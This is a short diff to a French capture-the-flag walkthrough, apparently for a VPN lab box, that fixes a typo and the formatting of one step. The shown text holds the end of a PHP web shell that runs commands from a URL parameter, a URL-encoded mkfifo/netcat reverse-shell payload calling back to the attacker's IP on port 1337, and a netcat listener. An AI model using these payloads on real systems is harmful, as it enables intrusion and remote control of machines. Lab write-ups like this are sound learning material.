@@ -79,8 +79,8 @@ system($_GET["c"]);
 echo "</pre>";
 ?> 
 ```
-Très bien, maintenant executons un reverse shell vi cette commande:
-``` ?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff ```
+Très bien, maintenant executons un reverse shell via cette commande: ?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff
+
 N'oubliez pas de changer les xx par votre ip sur le VPN et aussi ne soyez pas strupide ça va pas marcher si vous n'ouvrez pas votre port 1337 xD
 ```
 quasar@pwn:~/rootme$ nc -lvnp 1337
